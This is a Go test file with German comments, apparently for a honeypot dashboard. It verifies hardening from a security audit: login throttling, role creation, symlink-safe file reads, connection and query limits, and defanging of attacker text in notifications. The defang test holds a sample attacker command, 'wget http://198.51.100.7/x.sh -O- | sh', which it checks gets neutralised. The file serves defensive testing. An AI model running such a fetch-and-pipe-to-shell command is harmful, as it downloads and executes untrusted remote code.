package main

// Tests zu Funden des dritten Audits (docs/AUDIT-3.md, nur lokal), soweit sie nicht bei den
// betroffenen Funktionen stehen (M1/M2: mimicguard_test.go, M3: abusereport_test.go, feed_test.go).

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// N1: Ein neues Konto bekommt seine Rolle im selben Schritt; nie kurz admin.
func TestN1CreateUserRole(t *testing.T) {
	h := testHive(t)
	h.auth = NewAuth(h.st, "tok", false)
	if err := h.auth.CreateUser("leser", "langgenug123", "viewer"); err != nil {
		t.Fatal(err)
	}
	var role string
	h.st.db.QueryRow(`SELECT role FROM users WHERE username = 'leser'`).Scan(&role)
	if role != "viewer" || !h.auth.Check("leser", "langgenug123") {
		t.Fatalf("Rolle %q", role)
	}
	if h.auth.CreateUser("leser", "anderespasswort1", "admin") == nil {
		t.Fatal("vorhandenes Konto überschrieben")
	}
	h.st.db.QueryRow(`SELECT role FROM users WHERE username = 'leser'`).Scan(&role)
	if role != "viewer" || h.auth.Check("leser", "anderespasswort1") {
		t.Fatal("Rolle oder Passwort durch zweiten Versuch geändert")
	}
}

// N2: Login nur mit dem Header der UI (keine Anmeldeversuche aus fremden Webseiten).
func TestN2LoginNeedsHeader(t *testing.T) {
	st := testStore(t)
	a := NewAuth(st, "", false)
	a.EnsureAdmin("admin", "langgenug123")
	login := func(header bool) int {
		req := httptest.NewRequest("POST", "/api/login", strings.NewReader(`{"username":"admin","password":"falschfalsch"}`))
		req.Header.Set("Content-Type", "application/json")
		if header {
			req.Header.Set("X-Requested-With", "hivornet")
		}
		w := httptest.NewRecorder()
		a.Login(w, req)
		return w.Code
	}
	for i := 0; i < 15; i++ {
		if c := login(false); c != 403 {
			t.Fatalf("ohne Header: %d", c)
		}
	}
	if c := login(true); c != 401 { // nicht gesperrt: die Versuche ohne Header zählten nicht
		t.Fatalf("mit Header: %d", c)
	}
}

// N3: IPv6 je /64 gedrosselt; Fehlversuche aus dem Internet sperren das Heimnetz nicht aus.
func TestN3ThrottleV6AndLocal(t *testing.T) {
	a := NewAuth(testStore(t), "", false)
	n := 0
	for i := 0; i < 30; i++ {
		if a.attempt(fmt.Sprintf("2001:db8:1:2::%x", i+1)) {
			n++
		}
	}
	if n != failsPerIP {
		t.Fatalf("/64: %d Versuche statt %d", n, failsPerIP)
	}
	if !a.attempt("2001:db8:1:3::1") {
		t.Fatal("anderes /64 gesperrt")
	}
	// globale Grenze ausschöpfen (viele Adressen aus dem Internet)
	for i := 0; i < failsGlobal+5; i++ {
		a.attempt(fmt.Sprintf("203.0.113.%d", i%250+1))
		a.attempt(fmt.Sprintf("198.51.100.%d", i%250+1))
	}
	if a.attempt("198.51.100.251") {
		t.Fatal("globale Grenze greift nicht")
	}
	if !a.attempt("192.168.178.20") {
		t.Fatal("Heimnetz durch Versuche aus dem Internet ausgesperrt")
	}
	for i := 0; i < failsPerIP; i++ {
		a.attempt("192.168.178.21")
	}
	if a.attempt("192.168.178.21") {
		t.Fatal("Grenze je Adresse gilt im Heimnetz nicht")
	}
}

// N4: Passwortwechsel und Backup-Export prüfen das Passwort mit derselben Drossel.
func TestN4PasswordChecksThrottled(t *testing.T) {
	h := testHive(t)
	h.auth = NewAuth(h.st, "tok", false)
	h.auth.EnsureAdmin("admin", "langgenug123")
	rec := httptest.NewRecorder()
	if err := h.auth.startSession(rec, httptest.NewRequest("POST", "/", nil), "admin"); err != nil {
		t.Fatal(err)
	}
	cookie := rec.Result().Cookies()[0]
	call := func(fn http.HandlerFunc, path, body string) int {
		req := httptest.NewRequest("POST", path, strings.NewReader(body))
		req.AddCookie(cookie)
		req.Header.Set("X-Requested-With", "hivornet")
		w := httptest.NewRecorder()
		fn(w, req)
		return w.Code
	}
	codes := map[int]int{}
	for i := 0; i < failsPerIP+3; i++ {
		codes[call(h.changePassword, "/api/password", `{"current":"falschfalsch","new":"nochlaengeresPW1"}`)]++
	}
	if codes[429] == 0 || codes[403] != failsPerIP {
		t.Fatalf("Passwortwechsel ohne Drossel: %v", codes)
	}
	if c := call(h.backupExport, "/api/backup/export", `{"password":"falschfalsch"}`); c != 429 {
		t.Fatalf("Backup-Export ohne Drossel: %d", c)
	}
}

// N5: Cowrie-Dateien nur als reguläre Dateien öffnen, nie über einen Verweis.
func TestN5OpenRegular(t *testing.T) {
	dir := t.TempDir()
	secret := filepath.Join(dir, "hive.db")
	os.WriteFile(secret, []byte("geheim\n"), 0o600)
	plain := filepath.Join(dir, "cowrie.json")
	os.WriteFile(plain, []byte("{}\n"), 0o644)
	if f, err := openRegular(plain); err != nil {
		t.Fatal(err)
	} else {
		f.Close()
	}
	if _, err := openRegular(dir); err == nil {
		t.Error("Ordner geöffnet")
	}
	link := filepath.Join(dir, "tty-link")
	if os.Symlink(secret, link) != nil {
		t.Skip("Symlinks hier nicht möglich (Windows ohne Rechte); läuft in der CI")
	}
	if _, err := openRegular(link); err == nil {
		t.Fatal("Symlink auf eine Datei des Hive geöffnet")
	}
	if fileHead(link) != "" {
		t.Fatal("fileHead folgt dem Symlink")
	}
}

// N6: Angreifertext löst in Messengern keine Erwähnungen aus und wird kein Link.
func TestN6Defang(t *testing.T) {
	in := "wget http://198.51.100.7/x.sh; curl HTTPS://example.net @everyone @here <!channel> <@U123> ftp://203.0.113.1/a"
	out := defang(in)
	for _, bad := range []string{"http://", "HTTPS://", "ftp://", "@everyone", "@here", "<!channel>", "<@U123>"} {
		if strings.Contains(out, bad) {
			t.Errorf("nicht entschärft: %q in %q", bad, out)
		}
	}
	if !strings.Contains(out, "hxxp://198.51.100.7/x.sh") || !strings.Contains(out, "@\u200beveryone") {
		t.Errorf("unlesbar entschärft: %q", out)
	}
	b := webhookBody(notice{Kind: "severe", Title: "x", Text: out})
	am, ok := b["allowed_mentions"].(map[string]any)
	if !ok || len(am["parse"].([]string)) != 0 {
		t.Errorf("Discord-Erwähnungen nicht abgeschaltet: %v", b["allowed_mentions"])
	}
	// Ablauf: Ereignis mit Angreifertext -> Meldung entschärft
	n := NewNotifier(func() NotifyConfig {
		return NotifyConfig{Enabled: true, OnSevere: true, OnCommand: true, MaxPerHour: 10}
	})
	e := ev("command", "203.0.113.30")
	e.Service, e.Session = "telnet", "s9"
	e.Data = []byte(`{"input":"wget http://198.51.100.7/x.sh -O- | sh @everyone"}`)
	n.OnEvent(e)
	select {
	case nt := <-n.ch:
		if strings.Contains(nt.Text, "http://") || strings.Contains(nt.Text, "@everyone") {
			t.Errorf("Meldung nicht entschärft: %q", nt.Text)
		}
	default:
		t.Fatal("keine Meldung")
	}
}

// N7: Live-Verbindungen sind je Sitzung und insgesamt begrenzt; Plätze werden frei.
func TestN7SSELimit(t *testing.T) {
	b := NewBroker()
	srv := httptest.NewServer(b)
	defer srv.Close()
	open := func(cookie string) (*http.Response, context.CancelFunc) {
		ctx, cancel := context.WithCancel(context.Background())
		req, _ := http.NewRequestWithContext(ctx, "GET", srv.URL, nil)
		req.AddCookie(&http.Cookie{Name: cookieName, Value: cookie})
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		return resp, cancel
	}
	var cancels []context.CancelFunc
	defer func() {
		for _, c := range cancels {
			c()
		}
	}()
	for i := 0; i < sseMaxPerClient; i++ {
		resp, c := open("sitzung-a")
		cancels = append(cancels, c)
		if resp.StatusCode != 200 {
			t.Fatalf("Verbindung %d: %d", i, resp.StatusCode)
		}
	}
	resp, c := open("sitzung-a")
	c()
	if resp.StatusCode != 429 {
		t.Fatalf("über der Grenze je Sitzung: %d", resp.StatusCode)
	}
	resp, c = open("sitzung-b")
	cancels = append(cancels, c)
	if resp.StatusCode != 200 {
		t.Fatalf("andere Sitzung: %d", resp.StatusCode)
	}
	// Plätze werden nach dem Schließen frei
	for _, c := range cancels {
		c()
	}
	cancels = nil
	deadline := time.Now().Add(3 * time.Second)
	for {
		b.mu.Lock()
		n := len(b.subs)
		b.mu.Unlock()
		if n == 0 {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("%d Verbindungen nicht freigegeben", n)
		}
		time.Sleep(20 * time.Millisecond)
	}
}

// N8: Eine Sicherung, die entpackt größer als die erlaubte Datenbank ist, wird abgelehnt.
func TestN8RestoreSizeLimit(t *testing.T) {
	fastKDF(t)
	oldMin := restoreMin
	t.Cleanup(func() { restoreMin = oldMin })
	restoreMin = 1 << 20
	h := testHive(t)
	h.dbPath = h.st.path
	h.maxDBBytes = 1 << 20
	h.auth = NewAuth(h.st, "tok", false)
	h.auth.EnsureAdmin("admin", "adminpasswort1")
	ui, _ := h.routes(false, "", http.NotFoundHandler())
	rec := httptest.NewRecorder()
	h.auth.startSession(rec, httptest.NewRequest("GET", "/", nil), "admin")
	cookie := rec.Result().Cookies()[0]
	var file bytes.Buffer
	if err := writeBackup(&file, bytes.NewReader(make([]byte, 4<<20)), "adminpasswort1", backupMeta{Format: "sqlite"}); err != nil {
		t.Fatal(err)
	}
	if file.Len() > 1<<20 {
		t.Fatalf("Testdatei zu groß: %d", file.Len())
	}
	var body bytes.Buffer
	mw := multipart.NewWriter(&body)
	mw.WriteField("password", "adminpasswort1")
	fw, _ := mw.CreateFormFile("file", "s.hvbak")
	fw.Write(file.Bytes())
	mw.Close()
	req := httptest.NewRequest("POST", "/api/backup/import", &body)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-Requested-With", "hivornet")
	req.AddCookie(cookie)
	w := httptest.NewRecorder()
	ui.ServeHTTP(w, req)
	if w.Code != 400 || !strings.Contains(w.Body.String(), "größer als") {
		t.Fatalf("übergroße Sicherung: %d %s", w.Code, w.Body.String())
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(h.dbPath), "restore.db.tmp")); err == nil {
		t.Error("Zwischendatei nicht entfernt")
	}
}

// M8: Eine geänderte Netzsperre gilt nach dem Update sofort, ohne Lücke (apply statt restart).
func TestM8FirewallAppliedAfterUpdate(t *testing.T) {
	calls := func(changed []string) string {
		var c []string
		applySystem(changed, func(n string, a ...string) error { c = append(c, n+" "+strings.Join(a, " ")); return nil }, io.Discard)
		return strings.Join(c, "\n")
	}
	for _, ch := range [][]string{{"usr/local/sbin/hivornet-firewall"}, {"etc/systemd/system/hivornet-firewall.service", "usr/local/sbin/hivornet-firewall"}} {
		got := calls(ch)
		if strings.Count(got, "/usr/local/sbin/hivornet-firewall apply") != 1 || strings.Contains(got, "restart hivornet-firewall") {
			t.Errorf("%v:\n%s", ch, got)
		}
	}
	if got := calls([]string{"usr/local/sbin/hivornet-cowrie-config"}); strings.Contains(got, "hivornet-firewall") {
		t.Errorf("Sperre ohne Änderung neu gesetzt:\n%s", got)
	}
}

// M5: Höchstens zwei teure Abfragen gleichzeitig; die dritte wartet und gibt bei Zeitablauf
// mit 503 auf, statt den Verbindungspool des Schreibers zu belegen.
func TestM5HeavyQueryLimit(t *testing.T) {
	h := testHive(t)
	r1, err1 := acquireHeavy(context.Background())
	r2, err2 := acquireHeavy(context.Background())
	if err1 != nil || err2 != nil {
		t.Fatal(err1, err2)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()
	if _, _, err := h.loadAttacks(ctx, time.Now().Add(-time.Hour), nil); !errors.Is(err, errBusy) {
		t.Fatalf("dritte Abfrage nicht begrenzt: %v", err)
	}
	w := httptest.NewRecorder()
	req := httptest.NewRequest("GET", "/api/attacks?range=24h", nil)
	rctx, rcancel := context.WithTimeout(req.Context(), 50*time.Millisecond)
	defer rcancel()
	h.attacks(w, req.WithContext(rctx))
	if w.Code != 503 {
		t.Errorf("Status bei voller Grenze: %d", w.Code)
	}
	r1()
	if _, _, err := h.loadAttacks(context.Background(), time.Now().Add(-time.Hour), nil); err != nil {
		t.Fatalf("nach Freigabe: %v", err)
	}
	r2()
	if len(heavySem) != 0 {
		t.Errorf("Plätze nicht zurückgegeben: %d", len(heavySem))
	}
}
